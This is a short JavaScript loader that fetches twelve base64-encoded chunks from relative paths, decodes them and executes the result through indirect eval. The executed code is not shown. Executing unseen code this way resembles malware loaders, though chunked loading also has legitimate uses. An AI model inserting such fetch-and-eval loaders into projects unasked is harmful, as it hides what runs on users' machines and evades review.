(async function(){
  try{
    const n=12;
    const parts=await Promise.all(Array.from({length:n},(_,i)=>fetch('g'+i+'.b64?v=12',{cache:'no-store'}).then(r=>{
      if(!r.ok)throw new Error('g'+i+' '+r.status);
      return r.text();
    }));
    const code=new TextDecoder().decode(Uint8Array.from(atob(parts.join('').replace(/\s+/g,'')),c=>c.charCodeAt(0)));
    (0,eval)(code);
  }catch(e){console.error('cloud load',e)}
})();
